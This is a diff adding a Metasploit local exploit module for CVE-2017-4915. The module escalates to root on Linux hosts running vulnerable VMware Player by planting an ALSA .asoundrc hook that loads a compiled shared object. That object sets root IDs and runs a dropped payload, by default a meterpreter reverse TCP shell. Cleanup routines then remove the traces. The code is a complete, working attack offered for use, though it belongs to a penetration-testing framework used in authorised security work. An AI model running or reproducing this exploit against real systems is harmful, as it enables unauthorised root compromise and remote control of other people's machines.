@@ -1,0 +1,261 @@
+##
+# This module requires Metasploit: https://metasploit.com/download
+# Current source: https://github.com/rapid7/metasploit-framework
+##
+
+class MetasploitModule < Msf::Exploit::Local
+  Rank = ExcellentRanking
+
+  include Msf::Exploit::EXE
+  include Msf::Post::File
+  include Msf::Exploit::FileDropper
+
+  def initialize(info = {})
+    super(update_info(info,
+      'Name'           => 'VMware Workstation ALSA Config File Local Privilege Escalation',
+      'Description'    => %q{
+        This module exploits a vulnerability in VMware Workstation Pro and
+        Player on Linux which allows users to escalate their privileges by
+        using an ALSA configuration file to load and execute a shared object
+        as root when launching a virtual machine with an attached sound card.
+
+        This module has been tested successfully on VMware Player version
+        12.5.0 on Debian Linux.
+      },
+      'References'     =>
+        [
+          [ 'CVE', '2017-4915' ],
+          [ 'EDB', '42045' ],
+          [ 'BID', '98566' ],
+          [ 'URL', 'https://gist.github.com/bcoles/cd26a831473088afafefc93641e184a9' ],
+          [ 'URL', 'https://www.vmware.com/security/advisories/VMSA-2017-0009.html' ],
+          [ 'URL', 'https://bugs.chromium.org/p/project-zero/issues/detail?id=1142' ]
+        ],
+      'License'        => MSF_LICENSE,
+      'Author'         =>
+        [
+          'Jann Horn', # Discovery and PoC
+          'Brendan Coles <bcoles[at]gmail.com>' # Metasploit
+        ],
+      'DisclosureDate' => 'May 22 2017',
+      'Platform'       => 'linux',
+      'Targets'        =>
+        [
+          [ 'Linux x86', { 'Arch' => ARCH_X86 } ],
+          [ 'Linux x64', { 'Arch' => ARCH_X64 } ]
+        ],
+      'DefaultOptions' =>
+        {
+          'Payload'     => 'linux/x64/meterpreter_reverse_tcp',
+          'WfsDelay'    => 30,
+          'PrependFork' => true
+        },
+      'DefaultTarget'  => 1,
+      'Arch'           => [ ARCH_X86, ARCH_X64 ],
+      'SessionTypes'   => [ 'shell', 'meterpreter' ],
+      'Privileged'     => true ))
+    register_options [
+      OptString.new('WritableDir', [ true, 'A directory where we can write files', '/tmp' ])
+    ]
+  end
+
+  def has_prereqs?
+    vmplayer = cmd_exec 'which vmplayer'
+    if vmplayer.include? 'vmplayer'
+      vprint_good 'vmplayer is installed'
+    else
+      print_error 'vmplayer is not installed. Exploitation will fail.'
+      return false
+    end
+
+    gcc = cmd_exec 'which gcc'
+    if gcc.include? 'gcc'
+      vprint_good 'gcc is installed'
+    else
+      print_error 'gcc is not installed. Compiling will fail.'
+      return false
+    end
+
+    true
+  end
+
+  def check
+    unless has_prereqs?
+      print_error 'Target missing prerequisites'
+      return CheckCode::Safe
+    end
+
+    begin
+      config = read_file '/etc/vmware/config'
+    rescue
+      config = ''
+    end
+
+    if config =~ /player\.product\.version\s*=\s*"([\d\.]+)"/
+      @version = Gem::Version.new $1.gsub(/\.$/, '')
+      vprint_status "VMware is version #{@version}"
+    else
+      print_error "Could not determine VMware version."
+      return CheckCode::Unknown
+    end
+
+    if @version < Gem::Version.new('12.5.6')
+      print_good 'Target version is vulnerable'
+      return CheckCode::Vulnerable
+    end
+
+    print_error 'Target version is not vulnerable'
+    CheckCode::Safe
+  end
+
+  def exploit
+    if check == CheckCode::Safe
+      print_error 'Target machine is not vulnerable'
+      return
+    end
+
+    @home_dir = cmd_exec 'echo ${HOME}'
+    unless @home_dir
+      print_error "Could not find user's home directory"
+      return
+    end
+    @prefs_file = "#{@home_dir}/.vmware/preferences"
+
+    fname = ".#{rand_text_alphanumeric rand(10) + 5}"
+    @base_dir = "#{datastore['WritableDir']}/#{fname}"
+    cmd_exec "mkdir #{@base_dir}"
+
+    so = %Q^
+/*
+Source: https://bugs.chromium.org/p/project-zero/issues/detail?id=1142
+Original shared object code by jhorn
+*/
+
+#define _GNU_SOURCE
+#include <stdlib.h>
+#include <string.h>
+#include <stdio.h>
+#include <unistd.h>
+#include <fcntl.h>
+#include <sys/prctl.h>
+#include <err.h>
+
+extern char *program_invocation_short_name;
+
+__attribute__((constructor)) void run(void) {
+  uid_t ruid, euid, suid;
+  if (getresuid(&ruid, &euid, &suid))
+    err(1, "getresuid");
+  if (ruid == 0 || euid == 0 || suid == 0) {
+    if (setresuid(0, 0, 0) || setresgid(0, 0, 0))
+      err(1, "setresxid");
+    system("#{@base_dir}/#{fname}.elf");
+    _exit(0);
+  }
+}
+^
+    vprint_status "Writing #{@base_dir}/#{fname}.c"
+    write_file "#{@base_dir}/#{fname}.c", so
+
+    vprint_status "Compiling #{@base_dir}/#{fname}.o"
+    output = cmd_exec "gcc -fPIC -shared -o #{@base_dir}/#{fname}.so #{@base_dir}/#{fname}.c -Wall -ldl -std=gnu99"
+    unless output == ''
+      print_error "Compilation failed: #{output}"
+      return
+    end
+
+    vmx = %Q|
+.encoding = "UTF-8"
+config.version = "8"
+virtualHW.version = "8"
+scsi0.present = "FALSE"
+memsize = "4"
+ide0:0.present = "FALSE"
+sound.present = "TRUE"
+sound.fileName = "-1"
+sound.autodetect = "TRUE"
+vmci0.present = "FALSE"
+hpet0.present = "FALSE"
+displayName = "#{fname}"
+guestOS = "other"
+nvram = "#{fname}.nvram"
+virtualHW.productCompatibility = "hosted"
+gui.exitOnCLIHLT = "FALSE"
+powerType.powerOff = "soft"
+powerType.powerOn = "soft"
+powerType.suspend = "soft"
+powerType.reset = "soft"
+floppy0.present = "FALSE"
+monitor_control.disable_longmode = 1
+|
+    vprint_status "Writing #{@base_dir}/#{fname}.vmx"
+    write_file "#{@base_dir}/#{fname}.vmx", vmx
+
+    vprint_status "Writing #{@base_dir}/#{fname}.elf"
+    write_file "#{@base_dir}/#{fname}.elf", generate_payload_exe
+
+    vprint_status "Setting #{@base_dir}/#{fname}.elf executable"
+    cmd_exec "chmod +x #{@base_dir}/#{fname}.elf"
+
+    asoundrc = %Q|
+hook_func.pulse_load_if_running {
+  lib "#{@base_dir}/#{fname}.so"
+  func "conf_pulse_hook_load_if_running"
+}
+|
+    vprint_status "Writing #{@home_dir}/.asoundrc"
+    write_file "#{@home_dir}/.asoundrc", asoundrc
+
+    vprint_status 'Disabling VMware hint popups'
+    unless directory? "#{@home_dir}/.vmware"
+      cmd_exec "mkdir #{@home_dir}/.vmware"
+      @remove_prefs_dir = true
+    end
+
+    if file? @prefs_file
+      begin
+        prefs = read_file @prefs_file
+      rescue
+        prefs = ''
+      end
+    end
+
+    if prefs.blank?
+      prefs = ".encoding = \"UTF8\"\n"
+      prefs << "pref.vmplayer.firstRunDismissedVersion = \"999\"\n"
+      prefs << "hints.hideAll = \"TRUE\"\n"
+      @remove_prefs_file = true
+    elsif prefs =~ /hints\.hideAll/i
+      prefs.gsub!(/hints\.hideAll.*$/i, 'hints.hideAll = "TRUE"')
+    else
+      prefs.sub!(/\n?\z/, "\nhints.hideAll = \"TRUE\"\n")
+    end
+    vprint_status "Writing #{@prefs_file}"
+    write_file "#{@prefs_file}", prefs
+
+    print_status 'Launching VMware Player...'
+    cmd_exec "vmplayer #{@base_dir}/#{fname}.vmx"
+  end
+
+  def cleanup
+    print_status "Removing #{@base_dir} directory"
+    cmd_exec "rm '#{@base_dir}' -rf"
+
+    print_status "Removing #{@home_dir}/.asoundrc"
+    cmd_exec "rm '#{@home_dir}/.asoundrc'"
+
+    if @remove_prefs_dir
+      print_status "Removing #{@home_dir}/.vmware directory"
+      cmd_exec "rm '#{@home_dir}/.vmware' -rf"
+    elsif @remove_prefs_file
+      print_status "Removing #{@prefs_file}"
+      cmd_exec "rm '#{@prefs_file}' -rf"
+    end
+  end
+
+  def on_new_session(session)
+    # if we don't /bin/sh here, our payload times out
+    session.shell_command_token '/bin/sh'
+    super
+  end
+end
